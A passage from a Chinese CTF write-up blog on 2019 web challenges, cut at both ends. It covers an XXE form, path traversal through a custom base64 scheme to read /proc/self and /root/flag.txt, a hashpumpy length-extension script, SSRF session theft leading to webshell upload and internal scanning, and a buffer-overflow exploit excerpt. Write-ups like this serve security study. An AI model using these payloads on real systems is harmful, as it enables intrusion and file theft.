class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"contactBody"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>请输入姓名<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"name entry "</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">placeholder</span>=<span class="string">"Your Name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"submit entry"</span> <span class="attr">onclick</span>=<span class="string">"func()"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shadow"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// document.getElementById().value</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span></span><br><span class="line"><span class="handlebars"><span class="xml">            '<span class="tag">&lt;<span class="name">\?xml</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">encoding</span>=<span class="string">"UTF-8"</span>\?&gt;</span>' +</span></span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;feedback&gt;'</span> +</span></span><br><span class="line"><span class="javascript">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span></span><br><span class="line"><span class="actionscript">            <span class="string">'&lt;/feedback&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(xml);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line">            if (xmlhttp.readyState == 4) &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.readyState);</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(xmlhttp.responseText);</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> res = xmlhttp.responseText;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="actionscript">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span></span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h3><p>主要思路就是上传文件，上传文件后。文件名会被编码，多测几次就可以发现是一个变表的base64编码，base64编码是固定3个字符编码为固定的4个字符，题目的还有一个点就是任意文件读取，name参数后跟任意文件的变表编码的值，所以根据上传的文件名进获取对应的编码，所以上传的文件名需要构造，文件名的长度需要是3的倍数才能确定最后的文件名，并且随便输入的报错信息不是apache+php的，最后才确定是一个Flask模拟的php，骗人用的<del>~</del></p>
<p>所以现在讲下具体操作步骤：</p>
<ul>
<li>设置要读的文件（比如要读的是passwd文件）,设置上传的文件名为’../.././/etc/passwd’（测试可以发现是2层目录，长度要是3的倍数）</li>
<li>分段进行上传，收集各段的编码后的字符进行拼接，比如axb8axb8axnVSml8jmNBjUS9</li>
<li>访问img.php?name=[文件编码后的编码]就可以读取到相应的文件</li>
</ul>
<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-2fda3cd70b9dfd2a.png" alt></p>
<p>所以接下来就是找flag的路径，由于我们不知道各个文件的路径，所以用/proc/self/来仅需读取</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/./</span>proc<span class="regexp">/self/</span>cmdline   <span class="comment">#可以读到当前服务为app.py</span></span><br><span class="line"><span class="comment">#python3 app.py sleep 36000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">../..<span class="comment">//proc/self/cwd/app.py  #可以读到本题的源码</span></span><br><span class="line">#####################################</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return <span class="string">'.'</span> <span class="keyword">in</span> filename and \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">@app.route(<span class="string">'/index.php'</span>)</span><br><span class="line">def home():</span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    return render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload.php'</span>, methods=[<span class="string">'POST'</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file and allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> not os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        else:</span><br><span class="line">            return <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    return redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/img.php'</span>, methods=[<span class="string">'GET'</span>])</span><br><span class="line">def img():</span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    return Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure>

<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">../../././proc/self/cwd/templates/upload.html  </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                上传图片</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> file %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img.php?name=</span></span></span><span class="template-variable">&#123;&#123; file &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    请上传一张图片</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- flag in /root/flag.txt ! Get it ! --&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>所以flag在/root/flag.txt下了最后利用</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>root<span class="regexp">/flag.txt     #读flag</span></span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-f4164106f9873a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h3 id="0x04-按F注入"><a href="#0x04-按F注入" class="headerlink" title="0x04 按F注入"></a>0x04 按F注入</h3><p>fbctf2019题目的修改题，目前只做到了回显数据库信息，还没读到flag，等复现完再写<br>参考：<a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 De1CTF Web_wp</title>
    <url>/2019/08/05/2019-De1CTF-Web-wp/</url>
    <content><![CDATA[<h3 id="0x01-SSRF-ME"><a href="#0x01-SSRF-ME" class="headerlink" title="0x01 SSRF ME"></a>0x01 SSRF ME</h3><p>这题没什么难度，就不多说了，根据代码逻辑构造hash拓展攻击，坑的就是找flag找了半天，找到了然后放提示了……直接贴代码</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># -*- codin<span class="variable">g:</span> utf-<span class="number">8</span> -*-</span><br><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib.parse <span class="keyword">as</span> <span class="keyword">change</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readfile</span> = <span class="string">'flag.txt'</span></span><br><span class="line">url1 =  <span class="string">'http://139.180.128.86/geneSign?param='</span> + <span class="built_in">readfile</span></span><br><span class="line">req = requests.<span class="built_in">get</span>(url = url1)</span><br><span class="line"><span class="keyword">sign</span> = req.content</span><br><span class="line">hash_sign = hashpumpy.hashpump(<span class="keyword">sign</span>, <span class="built_in">readfile</span> + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">sign_next = hash_sign[<span class="number">0</span>]</span><br><span class="line">action_next = <span class="keyword">change</span>.quote(hash_sign[<span class="number">1</span>][<span class="built_in">len</span>(<span class="built_in">readfile</span>):])</span><br><span class="line">url2 = <span class="string">'http://139.180.128.86/De1ta?param='</span>+<span class="built_in">readfile</span></span><br><span class="line">result = requests.<span class="built_in">get</span>(url = url2, cookies=&#123;<span class="string">'sign'</span>: sign_next, <span class="string">'action'</span>: action_next&#125;)</span><br><span class="line"><span class="keyword">print</span>(result.content)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-33565c3a822f2594.png" alt></p>
<h3 id="0x02-shellshellshell"><a href="#0x02-shellshellshell" class="headerlink" title="0x02 shellshellshell"></a>0x02 shellshellshell</h3><p>一层登录和去年的N1ctf的easyphp源码基本一样的，所以漏洞点也是基本一样的，github上有人写了easyphp的漏洞利用脚本<a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</a>，可以用ssrf脚本抓取到admin用户的session</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-0dd6421b8b45c056.png" alt></p>
<p>直接利用session登录admin用户，题目在admin用户的上传点没有做限制，可以上传任意文件，所以直接上传一个shell就好。</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-dc1712e3b4f43acd.png" alt><br>而且在上传点提示了flag在内网里，所以上传个shell后目的也很明确，去看一下/etc/hosts</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>	localhost</span><br><span class="line">::<span class="number">1</span>	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>	ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>	ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>	ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>	ip6-allrouters</span><br><span class="line"><span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span>	df459fa2cbad</span><br></pre></td></tr></table></figure>

<p>有一个172.18.0.3的内网地址，所以搭个代理出来扫描一下C段地址（强烈安利一波FCN），扫描到172.18.0.2上开了80端口，上来就是一个代码审计</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">    @mkdir($sandbox);</span></span><br><span class="line"><span class="php">    @chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_array($filename)) </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $filename = explode(<span class="string">'.'</span>, $filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $ext = end($filename);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span></span><br><span class="line"><span class="php">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span></span><br><span class="line"><span class="php">        $_ = $_POST[<span class="string">'hello'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>)</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">include</span>($_);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        unlink($new_name);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br></pre></td></tr></table></figure>
<p>emmmm，以前pwnhub的一个原题，上海赛又用了一次，贴下wp的地址：<a href="https://cloud.tencent.com/developer/article/1360551" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1360551</a>，跟着wp操作就可以上传一个shell.php，然后包含就可以Getsgell了，最后在/etc下找到了flag</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-6dc9875f8cc5fa3f.png" alt><br><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-840fd0082f85e1d4.png" alt></p>
<h3 id="0x03-cloudmusic-rev"><a href="#0x03-cloudmusic-rev" class="headerlink" title="0x03 cloudmusic_rev"></a>0x03 cloudmusic_rev</h3><p>这个题目的1.0版本再国赛总决赛题中有放出，该题为2.0版本，所以攻击流程和原题差不太多，参考：<a href="https://github.com/impakho/ciscn2019_final_web1。" target="_blank" rel="noopener">https://github.com/impakho/ciscn2019_final_web1。</a></p>
<p>相比国赛总决赛增加了‘.php’的过滤，但是返回值给了提示urlencode。urlencode编码后再base64编码，成功绕过，可以实现任意文件读取。</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-ee581396e4c5e7bb.png" alt></p>
<p>并且上传溢出admin密码的长度变了，之前是0x300，现在是0x70。</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-540a402178829b15.png" alt></p>
<p>所以在原题的exp基础上修改溢出长度</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">def upload_music():</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0</span>x6] + <span class="string">'\x00\x00\x03\x00'</span> +preset_music[<span class="number">0</span>x0<span class="variable">a:0x53</span>]</span><br><span class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0</span>x70 + <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">files</span> = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(url)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(data)</span><br><span class="line">    <span class="keyword">res</span> = post(<span class="number">1</span>, url, data, <span class="keyword">files</span>)</span><br><span class="line">    <span class="keyword">if</span> loggin<span class="variable">g:</span> <span class="keyword">print</span>(<span class="keyword">res</span>.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> in <span class="keyword">res</span>.tex<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(<span class="keyword">res</span>.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        excep<span class="variable">t:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
<p>溢出得到admin用户的密码：Mike84eiNxHcMVCz，查看firmware.php代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>])||strlen($_SESSION[<span class="string">'user'</span>])&lt;=<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="php">    ob_end_clean();</span></span><br><span class="line"><span class="php">    header(<span class="string">'Location: /hotload.php?page=login&amp;err=1'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SESSION[<span class="string">'role'</span>]!=<span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">    $padding=<span class="string">'Lorem ipsum dolor sit amet, consectetur adipisicing elit.'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">10</span>;$i++) $padding.=$padding;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'&lt;div&gt;&lt;div class="container" style="margin-top:30px"&gt;&lt;h3 style="color:red;margin-bottom:15px;"&gt;Only admin is permitted.&lt;/h3&gt;&lt;/div&gt;&lt;p style="visibility: hidden"&gt;'</span>.$padding.<span class="string">'&lt;/p&gt;&lt;/div&gt;'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file_data"</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_FILES[<span class="string">"file_data"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>||$_FILES[<span class="string">"file_data"</span>][<span class="string">"size"</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">        ob_end_clean();</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'upload err, maximum file size is 1MB.'</span>)));</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        mt_srand(time());</span></span><br><span class="line"><span class="php">        $firmware_filename=md5(mt_rand().$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">        $firmware_filename=<span class="keyword">__DIR__</span>.<span class="string">"/../uploads/firmware/"</span>.$firmware_filename.<span class="string">".elf"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (time()-$_SESSION[<span class="string">'timestamp'</span>]&lt;<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="php">            ob_end_clean();</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(json_encode(<span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="number">0</span>,<span class="string">'info'</span>=&gt;<span class="string">'too fast, try later.'</span>)));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'timestamp'</span>]=time();</span></span><br><span class="line"><span class="php">        move_uploaded_file($_FILES[<span class="string">"file_data"</span>][<span class="string">"tmp_name"</span>], $firmware_filename);</span></span><br><span class="line"><span class="php">        $handle = fopen($firmware_filename, <span class="string">"rb"</span>);</span></span><br><span class="line"><span class="php">        <span 